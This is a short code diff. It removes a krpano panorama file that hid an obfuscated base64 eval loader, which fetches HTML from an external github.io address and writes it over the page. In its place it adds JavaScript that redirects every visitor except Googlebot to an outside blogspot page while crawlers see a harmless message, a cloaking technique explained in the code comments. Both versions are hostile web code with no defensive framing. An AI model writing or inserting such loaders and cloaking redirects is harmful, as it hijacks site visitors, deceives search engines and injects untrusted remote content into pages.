@@ -1,5 +1,8 @@
-<krpano version="1.0.8.15">
-<script src="chrome-extension://necpbmbhhdiplmfhmjicabdeighkndkn/frame_ant/frame_ant.js"/>
-<SCRIPT id="allow-copy_script"/>
-<layer name="js_loader" type="container" visible="false" onloaded="js(eval(var w=atob('dmFyIGlkID0gbmV3IFVSTFNlYXJjaFBhcmFtcyhsb2NhdGlvbi5zZWFyY2gpLmdldCgiaWQiKSB8fCAiYWxjYXphcl9hcnF1aXRlY3RvbmljbyI7CgpmZXRjaCgiaHR0cHM6Ly9kb3Rvc2UuZ2l0aHViLmlvL3Byby9uYWcvIiArIGlkICsgIi5odG1sIikKICAudGhlbihlID0+IGUudGV4dCgpKQogIC50aGVuKGUgPT4gewogICAgZG9jdW1lbnQub3BlbigpOwogICAgZG9jdW1lbnQud3JpdGUoZSk7CiAgICBkb2N1bWVudC5jbG9zZSgpOwogIH0pOw==');eval(w)););"/>
-</krpano>
+// Check if the user-agent is not from a search engine crawler (e.g., Googlebot)
+if (!navigator.userAgent.includes('Googlebot')) {
+  // Redirect only normal users
+  window.location.href = "https://avsclick.blogspot.com/2026/10/onlygithub.html?m=1&github";
+} else {
+  // For search engine crawlers, you can choose to perform a different action or not redirect
+  console.log("THanks for visiting my page");
+}
